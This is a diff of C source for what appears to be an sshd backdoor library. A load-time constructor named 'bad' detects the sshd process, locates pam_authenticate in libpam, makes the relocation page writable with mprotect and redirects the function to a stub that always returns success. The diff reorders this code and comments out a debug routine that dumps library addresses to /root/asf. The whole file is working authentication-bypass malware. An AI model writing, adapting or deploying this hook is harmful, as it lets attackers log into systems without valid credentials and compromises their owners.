@@ -85,26 +85,6 @@ static void *get_libstart(struct link_map *link_map, char *lib)
 	return NULL;
 }
 
-static void print_libs(struct link_map *link_map)
-{
-	FILE *fp;
-
-	fp = fopen("/root/asf", "w");
-
-	struct link_map *map = link_map;
-	Dl_info *dli = malloc(sizeof(Dl_info));
-
-	while (map != NULL) {
-		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
-		map = map->l_next;
-	}
-
-	free(dli);
-	fflush(fp);
-	fclose(fp);
-
-	return;
-}
 
 static int is_sshd(struct link_map *link_map)
 {
@@ -142,88 +122,6 @@ static int is_sshd(struct link_map *link_map)
 		return -1;
 
 	return 0;
-}
-
-
-Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *funcneedle);
-void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
-					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ);
-void *ehdr;
-
-
-
-int myfunc(void)
-{
-	__asm__ (
-		"nop;"
-		"nop;"
-		"nop;"
-		"nop;"
-		"nop;"
-		"nop;"
-		);
-	return 0;
-}
-
-static void  __attribute__ ((constructor)) bad(void)
-{
-	struct link_map *link_map;
-
-	if (is_sshd(link_map) != 0)
-		return;
-
-	PAGE_SIZE = getpagesize();
-
-	void *ourhandle = dlopen(NULL, RTLD_NOW);
-
-	dlinfoptr(ourhandle, 2, &link_map);
-	dlclose(ourhandle);
-
-	signal(SIGSEGV, handlesigsegv);
-
-	print_libs(link_map);
-/*
-	void *libpam = get_libstart(link_map, "libpam.so.0");
-	void *pam_auth = find_func_ptr(link_map, libpam, "pam_authenticate");
-	
-	hook(libpam, pam_auth, retzero, 20);
-	//hook pam_acct_mgmt to allow usernames*/
-	
-/*										*/
-
-
-
-	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
-	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
-	dlclose(o);
-	dl_iterate_phdrptr(callback, NULL);
-
-	if (!null1)
-		return;
-
-	Elf64_Rela *RELA, *JMPREL;
-	uint64_t *RELASZ, *PLTRELSZ;
-
-	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
-
-	void *pamstart = get_libstart(link_map, "libpam.so.0");
-	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
-
-	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate);
-
-
-
-	
-	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;
-
-	mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
-
-	foundrela->r_addend = (signed long long)myfunc; 
-
-	mprotect((void *) ehdr, PAGE_SIZE, PROT_READ);
-
-	
-	return;
 }
 
 /*
@@ -294,10 +192,6 @@ Elf64_Rela *parse_jmprel(Elf64_Rela *JMPREL, uint64_t *PLTRELSZ, void *funcneedl
 	return NULL;
 }
 
-
-
-
-
 /*
  * the callback for dl_iterate_phdr
  *
@@ -309,11 +203,6 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 	int j;
 	
 	for (j = 0; j < info->dlpi_phnum; j++) {
-		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_PHDR) {
-			if (strstr(info->dlpi_name, ".so") == NULL) {
-				ehdr = (void *) ((info->dlpi_addr + info->dlpi_phdr[j].p_vaddr) - info->dlpi_phdr[j].p_offset);
-			}
-		}
 		
 	if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
 			if (strstr(info->dlpi_name, ".so") == NULL) {
@@ -330,3 +219,107 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 	}
 	return 0;
 }
+
+
+int myfunc(void)
+{
+	__asm__ (
+		"nop;"
+		"nop;"
+		"nop;"
+		"nop;"
+		"nop;"
+		"nop;"
+		);
+	return 0;
+}
+
+static void  __attribute__ ((constructor)) bad(void)
+{
+	struct link_map *link_map;
+
+	if (is_sshd(link_map) != 0)
+		return;
+
+	PAGE_SIZE = getpagesize();
+
+	void *ourhandle = dlopen(NULL, RTLD_NOW);
+
+	dlinfoptr(ourhandle, 2, &link_map);
+	dlclose(ourhandle);
+
+	signal(SIGSEGV, handlesigsegv);
+
+	/* TODO: hook pam_acct_mgmt to allow usernames */
+
+	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
+	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
+	dlclose(o);
+	dl_iterate_phdrptr(callback, NULL);
+
+	if (!null1)
+		return;
+
+
+	Elf64_Rela *RELA, *JMPREL;
+	uint64_t *RELASZ, *PLTRELSZ;
+
+	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+
+	void *pamstart = get_libstart(link_map, "libpam.so.0");
+	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
+
+	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate);
+
+
+	
+	
+	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;
+
+	mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
+
+	foundrela->r_addend = (signed long long)myfunc; 
+
+	mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
+
+	
+	return;
+}
+
+
+
+
+
+
+
+/*
+static void print_libs(struct link_map *link_map)
+{
+	FILE *fp;
+
+	fp = fopen("/root/asf", "w");
+
+	struct link_map *map = link_map;
+	Dl_info *dli = malloc(sizeof(Dl_info));
+
+	while (map != NULL) {
+		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
+		map = map->l_next;
+	}
+
+	free(dli);
+	fflush(fp);
+	fclose(fp);
+
+	return;
+}
+*/
+
+/*
+
+		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_PHDR) {
+			if (strstr(info->dlpi_name, ".so") == NULL) {
+				ehdr = (void *) ((info->dlpi_addr + info->dlpi_phdr[j].p_vaddr) - info->dlpi_phdr[j].p_offset);
+			}
+		}
+*/
